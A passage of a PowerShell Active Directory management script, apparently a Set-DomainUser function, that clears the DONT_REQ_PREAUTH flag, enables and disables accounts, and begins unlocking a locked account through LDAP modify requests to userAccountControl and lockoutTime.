                            $NewUAC = $CurrentUAC -band (-bnot $DONT_REQ_PREAUTH)
                            Write-Log "[Set-DomainUser] New userAccountControl: $NewUAC (0x$($NewUAC.ToString('X')))"

                            $ModifyRequest = New-Object System.DirectoryServices.Protocols.ModifyRequest
                            $ModifyRequest.DistinguishedName = $UserDN

                            $Modification = New-Object System.DirectoryServices.Protocols.DirectoryAttributeModification
                            $Modification.Name = "userAccountControl"
                            $Modification.Operation = [System.DirectoryServices.Protocols.DirectoryAttributeOperation]::Replace
                            $Modification.Add([string]$NewUAC) | Out-Null

                            $ModifyRequest.Modifications.Add($Modification) | Out-Null

                            $Response = $Script:LdapConnection.SendRequest($ModifyRequest)
                            if ($Response.ResultCode -ne [System.DirectoryServices.Protocols.ResultCode]::Success) {
                                throw "LDAP ModifyRequest failed: $($Response.ResultCode) - $($Response.ErrorMessage)"
                            }

                            if ($PassThru) {
                                return [PSCustomObject]@{
                                    Operation = "ClearDontReqPreauth"
                                    User = $TargetUser.sAMAccountName
                                    DistinguishedName = $UserDN
                                    OldUAC = $CurrentUAC
                                    NewUAC = $NewUAC
                                    Success = $true
                                    Message = "DONT_REQ_PREAUTH flag cleared - pre-authentication is required again"
                                }
                            } else {
                                Show-Line "Successfully cleared DONT_REQ_PREAUTH on: $($TargetUser.sAMAccountName)" -Class Hint
                            }
                        }
                    } catch {
                        throw "Failed to clear DONT_REQ_PREAUTH: $_"
                    }
                }

                # ===== Account State Management =====
                'EnableAccount' {
                    Write-Log "[Set-DomainUser] Enabling account: $($TargetUser.sAMAccountName)"

                    try {
                        # Get current userAccountControl
                        $CurrentUAC = if ($TargetUser.userAccountControl) {
                            [int]$TargetUser.userAccountControl
                        } else { 512 }

                        Write-Log "[Set-DomainUser] Current userAccountControl: $CurrentUAC (0x$($CurrentUAC.ToString('X')))"

                        # ACCOUNTDISABLE = 0x2
                        $ACCOUNTDISABLE = 0x2

                        if (($CurrentUAC -band $ACCOUNTDISABLE) -eq 0) {
                            if ($PassThru) {
                                return [PSCustomObject]@{
                                    Operation = "EnableAccount"
                                    User = $TargetUser.sAMAccountName
                                    DistinguishedName = $UserDN
                                    Success = $true
                                    Message = "Account already enabled (no change)"
                                }
                            } else {
                                Show-Line "Account already enabled: $($TargetUser.sAMAccountName)" -Class Note
                            }
                        }
                        else {
                            $NewUAC = $CurrentUAC -band (-bnot $ACCOUNTDISABLE)
                            Write-Log "[Set-DomainUser] New userAccountControl: $NewUAC (0x$($NewUAC.ToString('X')))"

                            $ModifyRequest = New-Object System.DirectoryServices.Protocols.ModifyRequest
                            $ModifyRequest.DistinguishedName = $UserDN

                            $Modification = New-Object System.DirectoryServices.Protocols.DirectoryAttributeModification
                            $Modification.Name = "userAccountControl"
                            $Modification.Operation = [System.DirectoryServices.Protocols.DirectoryAttributeOperation]::Replace
                            $Modification.Add([string]$NewUAC) | Out-Null

                            $ModifyRequest.Modifications.Add($Modification) | Out-Null

                            $Response = $Script:LdapConnection.SendRequest($ModifyRequest)
                            if ($Response.ResultCode -ne [System.DirectoryServices.Protocols.ResultCode]::Success) {
                                throw "LDAP ModifyRequest failed: $($Response.ResultCode) - $($Response.ErrorMessage)"
                            }

                            if ($PassThru) {
                                return [PSCustomObject]@{
                                    Operation = "EnableAccount"
                                    User = $TargetUser.sAMAccountName
                                    DistinguishedName = $UserDN
                                    OldUAC = $CurrentUAC
                                    NewUAC = $NewUAC
                                    Success = $true
                                    Message = "Account enabled"
                                }
                            } else {
                                Show-Line "Successfully enabled account: $($TargetUser.sAMAccountName)" -Class Hint
                            }
                        }
                    } catch {
                        throw "Failed to enable account: $_"
                    }
                }

                'DisableAccount' {
                    Write-Log "[Set-DomainUser] Disabling account: $($TargetUser.sAMAccountName)"

                    try {
                        # Get current userAccountControl
                        $CurrentUAC = if ($TargetUser.userAccountControl) {
                            [int]$TargetUser.userAccountControl
                        } else { 512 }

                        Write-Log "[Set-DomainUser] Current userAccountControl: $CurrentUAC (0x$($CurrentUAC.ToString('X')))"

                        # ACCOUNTDISABLE = 0x2
                        $ACCOUNTDISABLE = 0x2

                        if (($CurrentUAC -band $ACCOUNTDISABLE) -ne 0) {
                            if ($PassThru) {
                                return [PSCustomObject]@{
                                    Operation = "DisableAccount"
                                    User = $TargetUser.sAMAccountName
                                    DistinguishedName = $UserDN
                                    Success = $true
                                    Message = "Account already disabled (no change)"
                                }
                            } else {
                                Show-Line "Account already disabled: $($TargetUser.sAMAccountName)" -Class Note
                            }
                        }
                        else {
                            $NewUAC = $CurrentUAC -bor $ACCOUNTDISABLE
                            Write-Log "[Set-DomainUser] New userAccountControl: $NewUAC (0x$($NewUAC.ToString('X')))"

                            $ModifyRequest = New-Object System.DirectoryServices.Protocols.ModifyRequest
                            $ModifyRequest.DistinguishedName = $UserDN

                            $Modification = New-Object System.DirectoryServices.Protocols.DirectoryAttributeModification
                            $Modification.Name = "userAccountControl"
                            $Modification.Operation = [System.DirectoryServices.Protocols.DirectoryAttributeOperation]::Replace
                            $Modification.Add([string]$NewUAC) | Out-Null

                            $ModifyRequest.Modifications.Add($Modification) | Out-Null

                            $Response = $Script:LdapConnection.SendRequest($ModifyRequest)
                            if ($Response.ResultCode -ne [System.DirectoryServices.Protocols.ResultCode]::Success) {
                                throw "LDAP ModifyRequest failed: $($Response.ResultCode) - $($Response.ErrorMessage)"
                            }

                            if ($PassThru) {
                                return [PSCustomObject]@{
                                    Operation = "DisableAccount"
                                    User = $TargetUser.sAMAccountName
                                    DistinguishedName = $UserDN
                                    OldUAC = $CurrentUAC
                                    NewUAC = $NewUAC
                                    Success = $true
                                    Message = "Account disabled"
                                }
                            } else {
                                Show-Line "Successfully disabled account: $($TargetUser.sAMAccountName)" -Class Hint
                            }
                        }
                    } catch {
                        throw "Failed to disable account: $_"
                    }
                }

                'UnlockAccount' {
                    Write-Log "[Set-DomainUser] Unlocking account: $($TargetUser.sAMAccountName)"

                    try {
                        # Check if account is locked
                        $LockoutTime = $TargetUser.lockoutTime
                        $IsLocked = $LockoutTime -and ($LockoutTime -gt 0)

                        if (-not $IsLocked) {
                            if ($PassThru) {
                                return [PSCustomObject]@{
                                    Operation = "UnlockAccount"
                                    User = $TargetUser.sAMAccountName
                                    DistinguishedName = $UserDN
                                    Success = $true
                                    Message = "Account not locked (no change)"
                                }
                            } else {
                                Show-Line "Account not locked: $($TargetUser.sAMAccountName)" -Class Note
                            }
                        }
                        else {
                            Write-Log "[Set-DomainUser] Account is locked (lockoutTime: $LockoutTime)"

                            # Clear lockoutTime to unlock via ModifyRequest
                            $ModifyRequest = New-Object System.DirectoryServices.Protocols.ModifyRequest
